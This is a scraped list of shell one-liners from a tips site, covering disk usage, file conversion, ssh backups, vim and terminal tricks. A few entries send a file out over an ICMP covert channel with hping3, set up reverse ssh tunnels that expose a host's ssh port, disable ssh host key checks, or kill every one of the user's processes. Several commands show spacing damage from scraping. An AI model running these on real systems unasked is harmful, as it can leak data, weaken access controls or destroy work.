$ t=$(df| awk 'NR!=1{sum+=$2}END{print sum}');sudo  du / --max-depth=1|sed '$d'|sort -rn -k1 |  awk -v t=$t 'OFMT="%d" {M=64;  for (a=0;a<$1;a++){if (a>c){c=a}}br=a/c;b=M*br; for(x=0;x<b;x++){printf "\033[1;31m" "|" "\033[0m"}print " "$2" "(a/t*100)"% total"}'
copy
Resize an image to at least a specific resolution
$ convert -resize '1024x600^' image.jpg small-image.jpg
copy
Query well known ports list
$ getent services <<service>>
copy
Create .pdf from .doc
$ oowriter -pt pdf your_word_file.doc
copy
Diff XML files
$ diffxml() {  diff -wb <(xmllint --format "$1") <(xmllint --format "$2"); }
copy
Discovering all open files/dirs underneath a directory
$ lsof +D <dirname>
copy
"Clone" a list of installed packages from one Debian/Ubuntu Server to another
$ apt-get  install `ssh root@host_you_want_to_clone "dpkg -l |  grep ii" |  awk '{print $2}'`
copy
clear screen, keep prompt at eye-level (faster than clear(1), tput cl, etc.)
$ cls(){  printf "\33[2J";} or,  if no  printf,  cat >cls;<ctrl-v><ctrl+[>[2J<enter><ctrl+d> cls(){  cat cls;}
copy
Down for everyone or just me?
$ down4me() {  wget -qO - "http://www.downforeveryoneorjustme.com/$1" |  sed '/just you/!d;s/<[^>]*>//g' ; }
copy
A formatting test for David Winterbottom: improving commandlinefu for submitters
$ echo "?????, these are the umlauted vowels I sing to you. Oh, and sometimes ?, but I don't sing that one cause it doesn't rhyme."
copy
Compare copies of a file with md5
$ cmp file1 file2
copy
backup delicious bookmarks
$ curl --user login:password -o DeliciousBookmarks.xml -O 'https://api.del.icio.us/v1/posts/all'
copy
analyze traffic remotely over ssh w/ wireshark
$ ssh root@HOST  tcpdump -U -s0 -w - 'not port 22' |  wireshark -k -i -
copy
pretend to be busy in office to enjoy a cup of coffee
$ for i in {0..600}; do  echo $i;  sleep 1; done |  dialog --gauge "Install..." 6 40
copy
Get all links of a website
$ lynx -dump http://www.domain.com |  awk '/http/{print $2}'
copy
Find all active ip's in a subnet
$ sudo  arp-scan -I eth0 192.168.1.0/24
copy
Disassemble some shell code
$ echo -ne "<shellcode>" | x86dis -e 0 -s intel
copy
List bash functions defined in .bash_profile or .bashrc
$ compgen -A function
copy
Resume a detached screen session, resizing to fit the current terminal
$ screen -raAd
copy
ignore the .svn directory in filename completion
$ export FIGNORE=.svn
copy
Working random fact generator
$ wget randomfunfacts.com -O - 2>/dev/null |  grep \<strong\> |  sed "s;^.*<i>\(.*\)</i>.*$;\1;"
copy
Remote backups with tar over ssh
$ tar jcpf - [sourceDirs] |ssh user@host "cat > /path/to/backup/backupfile. tar.bz2"
copy
Pronounce an English word using Dictionary.com
$ pronounce(){  wget -qO- $( wget -qO- "http://dictionary.reference.com/browse/$@" |  grep 'soundUrl' |  head -n 1 |  sed 's|.*soundUrl=\([^&]*\)&.*|\1|' |  sed 's/%3A/:/g;s/%2F/\//g') |  mpg123 -; }
copy
Change pidgin status
$ purple-remote "setstatus?status=away&message=AFK"
copy
Grep by paragraph instead of by line.
$ grepp() { [ $# -eq 1 ] &&  perl -00ne "print  if /$1/i" ||  perl -00ne "print  if /$1/i" < "$2";}
copy
Vim: Switch from Horizontal split to Vertical split
$ ^W-L
copy
Numbers guessing game
$ A=1;B=100;X=0;C=0;N=$[$RANDOM%$B+1];until [ $X -eq $N ];do  read -p "N between $A and $B. Guess? " X;C=$(($C+1));A=$(($X<$N?$X:$A));B=$(($X>$N?$X:$B));done;echo "Took you $C tries, Einstein";
copy
a trash function for bash
$ trash <file>
copy
Sort all running processes by their memory & CPU usage
$ ps aux --sort=%mem,%cpu
copy
generate a unique and secure password for every website that you login to
$ sitepass() {  echo -n "$@" |   md5sum |  sha1sum |  sha224sum |  sha256sum |  sha384sum |  sha512sum |  gzip - |  s trings -n 1 |  tr -d "[:space:]"  |  tr -s '[:print:]' |  tr '!-~' 'P-~!-O' |  rev |  cut -b 2-11;  history -d $(($HISTCMD-1)); }
copy
Change user, assume environment, stay in current dir
$ su -- user
copy
List Network Tools in Linux
$ apropos network |more
copy
Save current layout of top
$ <Shift + W>
copy
Testing hard disk reading speed
$ hdparm -t /dev/sda
copy
How fast is the connexion to a URL, some stats from curl
$ URL="http://www.google.com";curl -L --w "$URL
DNS %{ time_namelookup}s  conn %{ time_connect}s   time %{ time_total}s
Speed %{speed_download}bps Size %{size_download}bytes
" -o/dev/null -s $URL
copy
An easter egg built into python to give you the Zen of Python
$ python -c 'import this'
copy
Salvage a borked terminal
$ <ctrl+j>stty sane<ctrl+j>
copy
Get all IPs via ifconfig
$ ifconfig -a |  perl -nle'/(\d+\.\d+\.\d+\.\d+)/ &&  print $1'
copy
Use Cygwin to talk to the Windows clipboard
$ cat /dev/clipboard; $(somecommand) > /dev/clipboard
copy
Backup files incremental with rsync to a NTFS-Partition
$ rsync -rtvu --modify-window=1 --progress /media/SOURCE/ /media/TARGET/
copy
List programs with open ports and connections
$ lsof -i
copy
Find corrupted jpeg image files
$ find . -name "*jpg" -exec jpeginfo -c {} \; |  grep -E "WARNING|ERROR"
copy
'Fix' a typescript file created by the 'script' program to remove control characters
$ cat typescript |  perl -pe 's/\e([^\[\]]|\[.*?[a-zA-Z]|\].*?\a)//g' |  col -b > typescript-processed
copy
Share a 'screen'-session
$ screen -x
copy
Purge configuration files of removed packages on debian based systems
$ sudo  aptitude purge `dpkg --get-selections |  grep deinstall |  awk '{print $1}'`
copy
Show all detected mountable Drives/Partitions/BlockDevices
$ hwinfo --block --short
copy
Displays the attempted user name, ip address, and time of SSH failed logins on Debian machines
$ awk '/sshd/ && /Failed/ {gsub(/invalid user/,"");  printf "%-12s %-16s %s-%s-%s
", $9, $11, $1, $2, $3}' /var/log/auth.log
copy
Merge *.pdf files
$ gs -q -sPAPERSIZE=letter -dNOPAUSE -dBATCH -sDEVICE=pdfwrite -sOutputFile=out.pdf `ls *.pdf`
copy
Append stdout and stderr to a file, and print stderr to the screen [bash]
$ somecommand 2>&1 >> logfile |  tee -a logfile
copy
quickly change all .html extensions on files in folder to .htm
$ for i in *.html ; do  mv $i ${i%.html}.htm ; done
copy
Delete the specified line
$ sed -i 8d ~/.ssh/known_hosts
copy
Read the output of a command into the buffer in vim
$ :r !command
copy
Create an SSH SOCKS proxy server on localhost:8000 that will re-start itself if something breaks the connection temporarily
$ autossh -f -M 20000 -D 8000 somehost -N
copy
Find broken symlinks
$ find . -type l ! -exec  test -e {} \; -print
copy
ssh tunnel with auto reconnect ability
$ while [ ! -f /tmp/stop ]; do  ssh -o ExitOnForwardFailure=yes -R 2222:localhost:22 target " while  nc -zv localhost 2222; do  sleep 5; done";  sleep 5;done
copy
find process associated with a port
$ fuser [portnumber]/[proto]
copy
Echo the latest commands from commandlinefu on the console
$ wget -O - http://www.commandlinefu.com/commands/browse/rss 2>/dev/null |  awk '/\s*<title/ {z=match($0, /CDATA\[([^\]]*)\]/, b);print b[1]} /\s*<description/ {c=match($0, /code>(.*)<\/code>/, d);print d[1]"
"} '
copy
add all files not under version control to repository
$ svn status |grep '\?' |awk '{print $2}'|  xargs  svn add
copy
Using a single sudo to run multiple && arguments
$ sudo -s <<< ' apt update -y &&  apt upgrade -y'
copy
Disco lights in the terminal
$ while true; do  pri ntf "\e[38;5;$(($(od -d -N 2 -A  n /dev/ura ndom)%$(tput colors)))m.\e[0m"; do ne
copy
Show how old your linux OS installtion is
$ sudo  tune2fs -l $(df -h / |(read;  awk '{print $1; exit}')) |  grep -i created
copy
Fetch the current human population of Earth
$ curl -s http://www.census.gov/popclock/data/population/world |  python -c 'import json,sys;obj=json.load(sys.stdin);print obj["world"]["population"]'
copy
Discover the process start time
$ ps -eo pid,lstart,cmd
copy
The fastest remote directory rsync over ssh archival I can muster (40MB/s over 1gb NICs)
$ rsync -aHAXxv --numeric-ids --delete --progress -e "ssh -T -c arcfour -o Compression=no -x" user@<source>:<source_dir> <dest_dir>
copy
True Random Dice Roll
$ tr -cd '1-6' < /dev/urandom |  head -c 1;  echo
copy
Automatically find and re-attach to a detached screen session
$ screen -D -R
copy
This is how you should push a string in a command's stdin.
$ command <<< word
copy
ping as traceroute
$ for i in {1..30}; do   ping -t $i -c 1 google.com; done |  grep "Time to live exceeded"
copy
what model of computer I'm using?
$ sudo  dmidecode |  grep Product
copy
Extract tar content without leading parent directory
$ tar -xaf archive. tar.gz --strip-components=1
copy
Target a specific column for pattern substitution
$ awk '{gsub("foo","bar",$5)}1'  file
copy
Run a command when a file is changed
$ while  inotifywait -e modify /tmp/myfile; do firefox; done
copy
Watch several log files of different machines in a single multitail window on your own machine
$ multitail -l 'ssh machine1 "tail -f /var/log/apache2/error.log"' -l 'ssh machine2 "tail -f /var/log/apache2/error.log"'
copy
Substrings a variable
$ var='123456789';  echo ${var:<start_pos>:<offset>}
copy
One command line web server on port 80 using nc (netcat)
$ while  true ; do  nc -l 80  < index.html ; done
copy
RDP through SSH tunnel
$ ssh -f -L3389:<RDP_HOST>:3389 <SSH_PROXY> "sleep 10" &&  rdesktop -T'<WINDOW_TITLE>' -uAdministrator -g800x600 -a8 -rsound:off -rclipboard:PRIMARYCLIPBOARD -5 localhost
copy
Numeric zero padding file rename
$ rename 's/\d+/sprintf("%04d",$&)/e' *.jpg
copy
Find out the starting directory of a script
$ echo "${0%/*}"
copy
Remote screenshot
$ ssh user@remote-host "DISPLAY=:0.0  import -window root -format png -"|display -format png -
copy
Google text-to-speech in mp3 format
$ say(){  mplayer -user-agent Mozilla "http://translate.google.com/translate_tts?tl=en&q=$(echo $* |  sed 's#\ #\+#g')" > /dev/null 2>&1 ;  }
copy
add the result of a command into vi
$ !!command
copy
Place the NUM-th argument of the most recent command on the shell
$ <ALT>+<.> or <ALT>+<NUM>+<.> or <ALT>+<NUM>,<ALT>+<.>
copy
Find the package a command belongs to on Debian
$ dpkg -S $(  which   ls )
copy
Look up a unicode character by name
$ egrep -i "^[0-9a-f]{4,} .*$*" $(locate CharName.pm) |  while  read h d; do /usr/bin/printf "\U$(printf "%08x" 0x$h)\tU+%s\t%s
" $h "$d"; done
copy
Start dd and show progress every X seconds
$ dd if=/path/inputfile |  pv |  dd of=/path/outpufile
copy
Ask user to confirm
$ Confirm() {  read -sn 1 -p "$1 [Y/N]? "; [[ $REPLY = [Yy] ]]; }
copy
Capture video of a linux desktop
$ ffmpeg -y -f alsa -ac 2 -i pulse -f x11grab -r 30 -s `xdpyinfo |  grep 'dimensions:'|awk '{print $2}'` -i :0.0 -acodec pcm_s16le output.wav -an -vcodec libx264 -vpre lossless_ultrafast -threads 0 output.mp4
copy
Random unsigned integer
$ echo $(openssl rand 4 |  od -DAn)
copy
kill all process that belongs to you
$ kill -9 -1
copy
Make a file not writable / immutable by root
$ sudo  chattr +i <file>
copy
Continue a current job in the background
$ <ctrl+z>  bg
copy
translates acronyms for you
$ wtf is <acronym>
copy
Delete DOS Characters via VIM (^M)
$ :set ff=unix
copy
Create an animated gif from a Youtube video
$ url=http://www.youtube.com/watch?v=V5bYDhZBFLA;  youtube-dl -b $url;  mplayer $(ls ${url##*=}*|  tail -n1) -ss 00:57 -endpos 10 -vo gif89a:fps=5:output=output.gif -vf scale=400:300 -nosound
copy
Print just line 4 from a textfile
$ sed -n '4{p;q}'
copy
Print just line 4 from a textfile
$ sed -n '4p'
copy
Quick HTML image gallery from folder contents
$ find . -iname '*.jpg' -exec  echo '<img src="{}">' \; > gallery.html
copy
Get your external IP address without curl
$ wget -qO- icanhazip.com
copy
Countdown Clock
$ MIN=1 &&  for i in $(seq $(($MIN*60)) -1 1); do  echo -n "$i, ";  sleep 1; done;  echo -e "

BOOOM! Time to start."
copy
lines in file2 that are not in file1
$ grep -Fxv -f file1 file2
copy
JSON processing with Python
$ curl -s "http://feeds.delicious.com/v2/json?count=5" |  python -m json.tool |  less -R
copy
Start a HTTP server which serves Python docs
$ pydoc -p 8888 &  gnome-open http://localhost:8888
copy
Optimize PDF documents
$ gs -sDEVICE=pdfwrite -dCompatibilityLevel=1.4 -dPDFSETTINGS=/screen -dNOPAUSE -dQUIET -dBATCH -sOutputFile=output.pdf input.pdf
copy
Do some learning...
$ ls /usr/bin |  xargs  whatis |  grep -v nothing |  less
copy
Insert the last argument of the previous command
$ <ALT> .
copy
Carriage return for reprinting on the same line
$ while true; do  echo -ne "$(date)\r";  sleep 1; done
copy
Copy a folder tree through ssh using compression (no temporary files)
$ ssh <host> ' tar -cz /<folder>/<subfolder>' |  tar -xvz
copy
command line calculator
$ calc(){  awk "BEGIN{  print $* }" ;}
copy
Backup a local drive into a file on the remote host via ssh
$ dd if=/dev/sda |  ssh user@server ' dd of=sda.img'
copy
Kill processes that have been running for more than a week
$ find /proc -user myuser -maxdepth 1 -type d -mtime +7 -exec  basename {} \; |  xargs  kill -9
copy
Print text string vertically, one character per line.
$ echo "vertical text" |  grep -o '.'
copy
Find running binary executables that were not installed using dpkg
$ cat /var/lib/dpkg/info/*.list > /tmp/listin ;  ls /proc/*/exe |xargs -l  readlink |  grep -xvFf /tmp/listin;  rm /tmp/listin
copy
Add prefix onto filenames
$ rename 's/^/prefix/' *
copy
Pick a random line from a file
$ shuf -n1 file.txt
copy
Get all these commands in a text file with description.
$ for x in `jot - 0 2400 25`; do  curl "http://www.commandlinefu.com/commands/browse/sort-by-votes/plaintext/$x"  ; done > commandlinefu.txt
copy
Stripping ^M at end of each line for files
$ dos2unix <filenames>
copy
Find removed files still in use via /proc
$ find -L /proc/*/fd -links 0 2>/dev/null
copy
Connect to google talk through ssh by setting your IM client to use the localhost 5432 port
$ ssh -f -N -L 5432:talk.google.com:5222 user@home.network.com
copy
List and delete files older than one year
$ find <directory path> -mtime +365 -and -not -type d -delete
copy
for all flv files in a dir, grab the first frame and make a jpg.
$ for f in *.flv; do  ffmpeg -y -i "$f" -f image2 -ss 10 -vframes 1 -an "${f%.flv}.jpg"; done
copy
wrap long lines of a text
$ fold -s -w 90 file.txt
copy
Grep colorized
$ grep -i --color=auto
copy
from within vi, pipe a chunk of lines to a command line and replace the chunk with the result
$ !}sort
copy
Grep for word in directory (recursive)
$ grep --color=auto -iRnH "$search_word" $directory
copy
Unix alias for date command that lets you create timestamps in ISO 8601 format
$ alias timestamp='date "+%Y%m%dT%H%M%S"'
copy
Grep without having it show its own process in the results
$ ps aux |  grep "[s]ome_text"
copy
count IPv4 connections per IP
$ netstat -anp |grep 'tcp\|udp' |  awk '{print $5}' |  sed s/::ffff:// |  cut -d: -f1 |  sort |  uniq -c |  sort -n
copy
Files extension change
$ rename .oldextension .newextension *.oldextension
copy
archive all files containing local changes (svn)
$ svn  st |  cut -c 8- |  sed 's/^/\"/;s/$/\"/' |  xargs  tar -czvf ../backup.tgz
copy
Just run it ;)
$ echo SSBMb3ZlIFlvdQo= |  base64 -d
copy
pattern match in awk - no grep
$ awk '/pattern1/ && /pattern2/ && !/pattern3/ {print}'
copy
Block an IP address from connecting to a server
$ iptables -A INPUT -s 222.35.138.25/32 -j DROP
copy
Optimal way of deleting huge numbers of files
$ find /path/to/dir -type f -print0 |  xargs -0  rm
copy
Optimal way of deleting huge numbers of files
$ rsync -a --delete empty-dir/ target-dir/
copy
du with colored bar graph
$ du -x --max-depth=1|sort -rn|awk -F / -v c=$COLUMNS 'NR==1{t=$1} NR>1{r=int($1/t*c+.5); b="\033[1;31m";  for (i=0; i<r; i++) b=b"#";  printf " %5.2f%% %s\033[0m %s
", $1/t*100, b, $2}'|tac
copy
quick copy
$ cp foo{,bak}
copy
Sending a file over icmp with hping
$ hping3 10.0.2.254 --icmp --sign MSGID1 -d 50 -c 1 --file a_file
copy
Kill a broken ssh connection
$ <Return>~.
copy
Convert JSON to YAML
$ ruby -ryaml -rjson -e 'puts YAML.dump(JSON.parse(STDIN.read))' < file.json > file.yaml
copy
Convert Shell Text to Upper/Lower Case
$ ALT-U / ALT-L
copy
Binary digits Matrix effect
$ perl -e '$|++;  while (1) {  print " " x (rand(35) + 1), int(rand(2)) }'
copy
open two files side by side in vim (one window, two panes)
$ vim -O file1 file2
copy
repeat a command every one second
$ watch -n 1 "do foo"
copy
Recursively find top 20 largest files (> 1MB) sort human readable format
$ find . -type f -print0 |  xargs -0  du -h |  sort -hr |  head -20
copy
Update all packages installed via homebrew
$ brew update &&  brew upgrade ` brew outdated`
copy
open a screenshot of a remote desktop via ssh
$ xloadimage <(ssh USER@HOSTNAME DISPLAY=:0.0  import -window root png:-)
copy
Find ulimit values of currently running process
$ cat /proc/PID/limits
copy
diff current vi buffer edits against original file
$ :w !diff -u % -
copy
Redirect tar extract to another directory
$ tar xfz filename. tar.gz -C PathToDirectory
copy
print multiplication formulas
$ seq 9 |  sed 'H;g' |  awk -v RS='' '{for(i=1;i<=NF;i++)printf("%dx%d=%d%s", i, NR, i*NR, i==NR?"
":"\t")}'
copy
Find Malware in the current and sub directories by MD5 hashes
$ IFS=$'
' &&  for f in `find . -type f -exec  md5sum "{}" \;`; do  echo $f |  sed -r 's/^[^ ]+/Checking:/';  echo $f |  cut -f1 -d' ' |  netcat hash.cymru.com 43 ; done
copy
Execute a command, convert output to .png file, upload file to imgur.com, then returning the address of the .png.
$ imgur(){ $*|convert label:@- png:-|curl -F "image=@-" -F "key=1913b4ac473c692372d108209958fd15" http://api.imgur.com/2/upload.xml| grep -Eo "<original>(.)*</original>" |  grep -Eo "http://i.imgur.com/[^<]*";}
copy
Generate a random password 30 characters long
$ gpg --gen-random --armor 1 30
copy
all out
$ pkill -KILL -u username
copy
Run a ext4 file system check and badblocks scan with progress info
$ fsck.ext4 -cDfty -C 0 /dev/sdxx
copy
Selecting a random file/folder of a folder
$ shuf -n1 -e *
copy
List your MACs address
$ lsmac() {  ifconfig -a |  sed '/eth\|wl/!d;s/   Link.*HWaddr//' ; }
copy
ssh to machine behind shared NAT
$ ssh -NR 0.0.0.0:2222:127.0.0.1:22 user@jump.host.com
copy
Countdown Clock
$ MIN=10;for ((i=MIN*60;i>=0;i--));do  echo -ne "\r$(date -d"0+$i sec" +%H:%M:%S)";sleep 1;done
copy
list all file extensions in a directory
$ find . -type f |  awk -F'.' '{print $NF}' |  sort|  uniq -c |  sort -g
copy
Send an http HEAD request w/curl
$ curl -I http://localhost
copy
view hex mode in vim
$ :%!xxd
copy
View ~/.ssh/known_hosts key information
$ ssh-keygen -l -f ~/.ssh/known_hosts
copy
Kill all Zombie processes (Guaranteed!)
$ kill -9 `ps -xaw -o state -o ppid |  grep Z |  grep -v PID |  awk '{print $2}'`
copy
prevent accidents and test your command with echo
$ echo  rm *.txt
copy
exclude a column with awk
$ awk '{ $5="";  print }'  file
copy
Get My Public IP Address
$ curl ifconfig.me
copy
pretend to be busy in office to enjoy a cup of coffee
$ for i in `seq 0 100`;do  timeout 6  dialog --gauge "Install..." 6 40 "$i";done
copy
Empty a file
$ :>  file
copy
Better way to use notify-send with at or cron
$ DISPLAY=:0.0 XAUTHORITY=~/.Xauthority  notify-send  test
copy
use screen as a terminal emulator to connect to serial consoles
$ screen /dev/tty<device> 9600
copy
Emptying a text file in one shot
$ :%d
copy
computes the most frequent used words of a text file
$ cat WAR_AND_PEACE_By_LeoTolstoi.txt |  tr -cs "[:alnum:]" "
"|  tr "[:lower:]" "[:upper:]" |  awk '{h[$1]++}END{for (i in h){print h[i]" "i}}'|sort -nr |  cat -n |  head -n 30
copy
Print info about your real user.
$ who loves mum
copy
Serve current directory tree at http://$HOSTNAME:8080/
$ twistd -n web --path .
copy
Open Remote Desktop (RDP) from command line and connect local resources
$ rdesktop -a24 -uAdministrator -pPassword  -r clipboard:CLIPBOARD -r disk:share=~/share -z -g 1280x900 -0 $@ &
copy
Restrict the bandwidth for the SCP command
$ scp -l10 pippo@serverciccio:/home/zutaniddu/* .
copy
live ssh network throughput test
$ pv /dev/zero|ssh $host 'cat > /dev/null'
copy
bash screensaver (scrolling ascii art with customizable message)
$ while [ 1 ]; do  banner 'ze missiles, zey are coming! ' |  while IFS="
"  read l; do  echo "$l";  sleep 0.01; done; done
copy
Upgrade all perl modules via CPAN
$ cpan -r
copy
Optimal way of deleting huge numbers of files
$ find /path/to/dir -type f -delete
copy
Remove lines that contain a specific pattern($1) from file($2).
$ sed -i '/myexpression/d' /path/to/file.txt
copy
List your largest installed packages (on Debian/Ubuntu)
$ dpigs
copy
rsync + find
$ find . -name "whatever.*" -print0 |  rsync -av --files-from=- --from0 ./ ./destination/
copy
autossh + ssh + screen = super rad perma-sessions
$ AUTOSSH_POLL=1  autossh -M 21010  hostname -t 'screen -Dr'
copy
Record microphone input and output to date stamped mp3 file
$ arecord -q -f  cd -r 44100 -c2 -t  raw | lame -S -x -h -b 128 - `date +%Y%m%d%H%M`.mp3
copy
cycle through a 256 colour palette
$ yes "$(seq 1 255)" |  while  read i; do  printf "\x1b[48;5;${i}m
";  sleep .01; done
copy
Parallel file downloading with wget
$ wget -nv http://en.wikipedia.org/wiki/Linux -O- |  egrep -o "http://[^[:space:]]*.jpg" |  xargs -P 10 -r -n 1  wget -nv
copy
move a lot of files over ssh
$ tar -cf - /home/user/test |  gzip -c |  ssh user@ sshServer 'cd /tmp;  tar xfz -'
copy
Cleanup firefox's database.
$ pgrep -u `id -u` firefox-bin ||  find ~/.mozilla/firefox -name '*.sqlite'|(while  read -e f; do  echo 'vacuum;'|sqlite3 "$f" ; done)
copy
vim easter egg
$ $ vim ... :help 42
copy
Find the process you are looking for minus the grepped one
$ pgrep command_name
copy
Stream YouTube URL directly to mplayer
$ id="dMH0bHeiRNg";mplayer -fs http://youtube.com/get_video.php?video_id=$id\&t=$(curl -s http://www.youtube.com/watch?v=$id |  sed -n 's/.*, "t": "\([^"]*\)", .*/\1/p')
copy
currently mounted filesystems in nice layout
$ column -t /proc/mounts
copy
Send email with one or more binary attachments
$ echo "Body goes here" |  mutt -s "A subject" -a /path/to/file.tar.gz recipient@example.com
copy
Salvage a borked terminal
$ echo <ctrl-v><esc>c<enter>
copy
Update twitter via curl
$ curl -u user -d status="Tweeting  from the shell" http://twitter.com/statuses/update.xml
copy
ssh autocomplete
$ complete -W "$(echo $(grep '^ ssh ' .bash_history |  sort -u |  sed 's/^ ssh //'))"  ssh
copy
Get all IPs via ifconfig
$ ifconfig |  perl -nle'/dr:(\S+)/ &&  print $1'
copy
VIM: Replace a string with an incrementing number between marks 'a and 'b (eg, convert string ZZZZ to 1, 2, 3, ...)
$ :let i=0 | 'a,'bg/ZZZZ/s/ZZZZ/\=i/ | let i=i+1
copy
Get the canonical, absolute path given a relative and/or noncanonical path
$ readlink -f ../super/symlink_bon/ahoy
copy
Create a Multi-Part Archive Without Proprietary Junkware
$ tar czv Pictures |  split -d -a 3 -b 16M - pics. tar.gz.
copy
Display last exit status of a command
$ echo $?
copy
Enable ** to expand files recursively (>=bash-4.0)
$ shopt -s globstar
copy
Delete all files found in directory A from directory B
$ for  file in <directory A>/*; do  rm <directory B>/`basename $ file`; done
copy
Command Line to Get the Stock Quote via Yahoo
$ curl -s 'http://download.finance.yahoo.com/d/quotes.csv?s=csco&f=l1'
copy
Plays Music from SomaFM
$ read -p "Which station? ";  mplayer --reallyquiet -vo none -ao sdl http://somafm.com/startstream=${REPLY}.pls
copy
Search for a single file and go to it
$ cd $(dirname $(find ~ -name emails.txt))
copy
Convert camelCase to underscores (camel_case)
$ sed -r 's/([a-z]+)([A-Z][a-z]+)/\1_\l\2/g' file.txt
copy
Set your profile so that you resume or start a screen session on login
$ echo "screen -DR" >> ~/.bash_profile
copy
play high-res video files on a slow processor
$ mplayer -framedrop -vfm  ffmpeg -lavdopts lowres=1:fast:skiploopfilter=all
copy
Create directory named after current date
$ mkdir $(date +%Y%m%d)
copy
Monitor dynamic changes in the dmesg log.
$ watch "dmesg |tail -15"
copy
Generate a list of installed packages on Debian-based systems
$ dpkg --get-selections > LIST_FILE
copy
find the process that is using a certain port e.g. port 3000
$ lsof -P |  grep ':3000'
copy
Edit the last or previous command line in an editor then execute
$ fc [history-number]
copy
Pause Current Thread
$ ctrl-z
copy
Converts to PDF all the OpenOffice.org files in the directory
$ for i in $(ls *.od{tp}); do unoconv -f pdf $i; done
copy
Create a bunch of dummy files for testing
$ touch {1..10}.txt
copy
Shows size of dirs and files, hidden or not, sorted.
$ du -cs * .[^\.]* |  sort -n
copy
Convert .wma files to .ogg with ffmpeg
$ find -name '*wma' -exec  ffmpeg -i {} -acodec vorbis -ab 128k {}.ogg \;
copy
Find distro name and/or version/release
$ cat /etc/*-release
copy
Generate Random Passwords
$ < /dev/urandom  tr -dc _A-Z-a-z-0-9 |  head -c6
copy
bash shortcut: !$ !^ !* !:3 !:h and !:t
$ echo foo bar foobar barfoo &&  echo !$ !^  !:3 !* &&   echo /usr/bin/foobar&&  echo !$:h !$:t
copy
Find recursively, from current directory down, files and directories whose names contain single or multiple whitespaces and replace each such occurrence with a single underscore.
$ find  ./  -name '*'  -exec   rename  's/\s+/_/g'  {}  \;
copy
Tells which group you DON'T belong to (opposite of command "groups") --- uses sed
$ sed -e "/$USER/d;s/:.*//g" /etc/group |  sed -e :a -e '/$/N;s/
/ /;ta'
copy
Quickly get summary of sizes for files and folders
$ du -sh *
copy
Host cpu performance
$ openssl speed md5
copy
drop first column of output by piping to this
$ awk '{ $1="";print}'
copy
Create a bunch of dummy text files
$ base64 /dev/urandom |  head -c 33554432 |  split -b 8192 -da 4  - dummy.
copy
Get the Nth argument of the last command (handling spaces correctly)
$ !:n
copy
Retry the previous command until it exits successfully
$ !!;  while [ $? -ne 0 ]; do !!; done
copy
Play awesome rythmic noise using aplay
$ echo "main(i){for(i=0;;i++)putchar(((i*(i>>8|i>>9)&46&i>>8))^(i&i>>13|i>>6));}" |  gcc -x c - && ./a.out |  aplay
copy
Turns red the stderr output
$ color()(set -o pipefail;"$@" 2>&1>&3|sed $'s,.*,\e[31m&\e[m,'>&2)3>&1
copy
Recursively unrar into dir containing archive
$ find . -name '*.rar' -execdir  unrar e {} \;
copy
Temporarily ignore mismatched SSH host key
$ ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no username@host
copy
Remove all zero size files from current directory (not recursive)
$ find . -maxdepth 1 -size 0c -delete
copy
Watch the progress of 'dd'
$ pv -tpreb /dev/urandom |  dd of=file.img
copy
Get a stream feed from a Twitter user
$ step1 ; step2 ; step3 ; step4 ;  curl -o- --get 'https://stream.twitter.com/1/statuses/filter.json' --header "$oauth_header" --data "follow=$id"
copy
Create the authorization header required for a Twitter stream feed
$ step4() { oauth_header="Authorization: OAuth oauth_consumer_key=\"$k1\", oauth_nonce=\"$once\", oauth_signature=\"$signature\", oauth_signature_method=\"HMAC-SHA1\", oauth_timestamp=\"$ts\", oauth_token=\"$k3\", oauth_version=\"1.0\"" ; }
copy
Create the signature base string required for a Twitter stream feed
$ step2(){ b="GET&https%3A%2F%2Fstream.twitter.com%2F1%2Fstatuses%2Ffilter.json&follow%3D${id}%26oauth_consumer_key%3D${k1}%26oauth_nonce%3D${once}%26oauth_signature_method%3DHMAC-SHA1%26oauth_timestamp%3D${ts}%26oauth_token%3D${k3}%26oauth_version%3D1.0";}
copy
Create the oauth token required for a Twitter stream feed
$ step3() { s=$( echo -n $b |  openssl dgst -sha1 -hmac $hmac -binary |  openssl base64); signature=`for((i=0;i<${#s};i++)); do  case ${s:i:1} in +) e %2B;; /) e %2F;; =) e %3D;; *) e ${s:i:1};; esac ; done` ; } ; e() {  echo -n $1; }
copy
Check your spelling
$ aspell -a <<< '<WORDS>'
copy
Find all files larger than 500M and less than 1GB
$ find / -type f -size +500M -size -1G
copy
Show bandwidth use oneliner
$ while true; do  cat /proc/net/dev;  sleep 1; done |  awk -v dc="date \"+%T\"" '/eth0/{i = $2 - oi; o = $10 - oo; oi = $2; oo = $10; dc|getline d; close(dc);  if (a++)  printf "%s %8.2f KiB/s in %8.2f KiB/s out
", d, i/1024, o/1024}'
copy
Change/Modify timestamp interactively
$ touch -d $(zenity --calendar --date-format=%F) filename
copy
sort the contents of a text file in place.
$ sort -g -o list.txt{,}
copy
Instantly load bash history of one shell into another running shell
$ $ history -a #in one shell , and $ history -r #in another running shell
copy
Compare directories via diff
$ diff -rq dirA dirB
copy
copy with progress bar - rsync
$ rsync -rv <src> <dst> --progress
copy
Multiple variable assignments from command output in BASH
$ read day month year < <(date +'%d %m %y')
copy
List your MACs address
$ cat /sys/class/net/eth0/address
copy
Rename all files which contain the sub-string 'foo', replacing it with 'bar'
$ for i in ./*foo*;do  mv -- "$i" "${i//foo/bar}";done
copy
Create a 5 MB blank file via a seek hole
$ dd if=/dev/zero of=testfile.seek seek=5242879 bs=1 count=1
copy
Screensaver
$ alias screensaver='for ((;;)); do  echo -ne "\033[$((1+RANDOM%LINES));$((1+RANDOM%COLUMNS))H\033[$((RANDOM%2));3$((RANDOM%8))m$((RANDOM%10))";  sleep 0.1 ; done'
copy
ROT13 using the tr command
$ alias rot13="tr a-zA-Z n-za-mN-ZA-M"
copy
Bash logger
$ script /tmp/log.txt
copy
Recursively search for large files. Show size and location.
$ find . -size +100000k -exec  du -h {} \;
copy
Make vim open in tabs by default (save to .profile)
$ alias vim="vim -p"
copy
Rename HTML files according to their title tag
$ perl -wlne'/title>([^<]+)/i&&rename$ARGV,"$1.html"' *.html
copy
Secure copy from one server to another without rsync and preserve users, etc
$ tar -czvf - /src/dir |  ssh remotehost "(cd /dst/dir ;  tar -xzvf -)"
copy
the same as [Esc] in vim
$ Ctrl + [
copy
Binary clock
$ perl -e 'for(;;){@d=split("",`date +%H%M%S`);print"\r";for(0..5){printf"%.4b ",$d[$_]}sleep 1}'
copy
Function to split a string into an array
$ read -a ARR <<<'world domination now!';  echo ${ARR[2]};
copy
Generate MD5 hash for a string
$ md5sum <<<"test"
copy
Recompress all .gz files in current directory using bzip2 running 1 job per CPU core in parallel
